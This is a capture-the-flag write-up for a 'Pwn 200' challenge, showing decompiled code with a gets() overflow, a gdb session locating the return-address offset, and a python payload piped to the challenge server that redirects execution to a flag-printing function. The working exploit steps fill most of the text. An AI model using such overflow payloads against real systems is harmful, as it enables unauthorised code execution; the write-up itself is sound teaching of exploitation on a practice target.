# Pwn 200 - Flow

We are given ```nc 40.76.33.15 12367``` and a 32 bit binary.

Here is the pseudocode:

```C
int __cdecl main(int argc, const char **argv, const char **envp)
{
  setbuf(_bss_start, 0);
  vuln();
  return 0;
}

int vuln()
{
  int result; // eax
  char s; // [esp+Ch] [ebp-6Ch]

  memset(&s, 0, 0x64u);
  puts("You should give me your password, what could go wrong??");
  gets(&s);
  result = strcmp(&s, "Mitch Daniels");
  if ( !result )
    result = puts("Hey Mitch, I'm glad you made it to the b00tc4mp!\nYou really should consider a stronger password though");
  return result;
}

int print_flag()
{
  char s; // [esp+Ah] [ebp-3Eh]
  FILE *v2; // [esp+3Ch] [ebp-Ch]

  v2 = fopen("/home/flow/flag.txt", "r");
  if ( !v2 )
    puts(
      "Someone has ruined all of your chances! Maybe Mitch Daniels would know what to do... but you can ask an officer to fix this :)");
  __isoc99_fscanf(v2, "%s\n", &s);
  return puts(&s);
}
```

We can see that we have a gets() call, with which we can overflow the return address on the stack. Then there's a print flag function in the program, so we can just overwrite the return address to the address of the print flag function.

Here's what we do:

1. Open it up in gdb
2. disas vuln
3. break on the last instruction of vuln, the ret intsruction
4. run program and enter a recognizable pattern similar to in the cookie writeup
5. examine what's on top of the stack because that should be the address of the print flag function
6. replace the section in our pattern with what's on top of the stack with address of print flag function
7. pipe in with python and get our flag:

```
root@ctf:~# gdb flow
GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1
Copyright (C) 2016 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from flow...(no debugging symbols found)...done.
(gdb) disas vuln
Dump of assembler code for function vuln:
   0x08048591 <+0>:     push   %ebp
   0x08048592 <+1>:     mov    %esp,%ebp
   0x08048594 <+3>:     push   %edi
   0x08048595 <+4>:     sub    $0x74,%esp
   0x08048598 <+7>:     lea    -0x6c(%ebp),%edx
   0x0804859b <+10>:    mov    $0x0,%eax
   0x080485a0 <+15>:    mov    $0x19,%ecx
   0x080485a5 <+20>:    mov    %edx,%edi
   0x080485a7 <+22>:    rep stos %eax,%es:(%edi)
   0x080485a9 <+24>:    sub    $0xc,%esp
   0x080485ac <+27>:    push   $0x80486e0
   0x080485b1 <+32>:    call   0x8048420 <puts@plt>
   0x080485b6 <+37>:    add    $0x10,%esp
   0x080485b9 <+40>:    sub    $0xc,%esp
   0x080485bc <+43>:    lea    -0x6c(%ebp),%eax
   0x080485bf <+46>:    push   %eax
   0x080485c0 <+47>:    call   0x8048410 <gets@plt>
   0x080485c5 <+52>:    add    $0x10,%esp
   0x080485c8 <+55>:    sub    $0x8,%esp
   0x080485cb <+58>:    push   $0x8048718
   0x080485d0 <+63>:    lea    -0x6c(%ebp),%eax
   0x080485d3 <+66>:    push   %eax
   0x080485d4 <+67>:    call   0x80483f0 <strcmp@plt>
   0x080485d9 <+72>:    add    $0x10,%esp
   0x080485dc <+75>:    test   %eax,%eax
   0x080485de <+77>:    jne    0x80485f0 <vuln+95>
   0x080485e0 <+79>:    sub    $0xc,%esp
   0x080485e3 <+82>:    push   $0x8048728
   0x080485e8 <+87>:    call   0x8048420 <puts@plt>
---Type <return> to continue, or q <return> to quit---
   0x080485ed <+92>:    add    $0x10,%esp
   0x080485f0 <+95>:    nop
   0x080485f1 <+96>:    mov    -0x4(%ebp),%edi
   0x080485f4 <+99>:    leave
   0x080485f5 <+100>:   ret
End of assembler dump.
(gdb) break *0x80485f5
Breakpoint 1 at 0x80485f5
(gdb) r
Starting program: /root/flow
You should give me your password, what could go wrong??
AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ

Breakpoint 1, 0x080485f5 in vuln ()
(gdb) x/wx $esp
0xffffd64c:     0x08048584
(gdb) r
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /root/flow
You should give me your password, what could go wrong??
AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ0000111122223333444455556666777788889999

Breakpoint 1, 0x080485f5 in vuln ()
(gdb) x/wx $esp
0xffffd64c:     0x32323232
(gdb) quit
A debugging session is active.

        Inferior 1 [process 8334] will be killed.

Quit anyway? (y or n) y
root@ctf:~# python -c "print chr(0x32)"
2
root@ctf:~# python -c "print 'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ00001111' + ^C
root@ctf:~# objdump -d flow | grep "flag"
080485f6 <print_flag>:
 8048618:       75 10                   jne    804862a <print_flag+0x34>
root@ctf:~# python -c "print 'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ00001111\xf6\x85\x04\x08'" | ./flow
You should give me your password, what could go wrong??
Someone has ruined all of your chances! Maybe Mitch Daniels would know what to do... but you can ask an officer to fix this :)
Segmentation fault (core dumped)
root@ctf:~# python -c "print 'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ00001111\xf6\x85\x04\x08'" | nc 40.76.33.15 12367
You should give me your password, what could go wrong??
b0ctf{Y0ur_p4$$w0rd_w4z_2_gud}
root@ctf:~#
```

## Flag
### b0ctf{Y0ur_p4$$w0rd_w4z_2_gud}
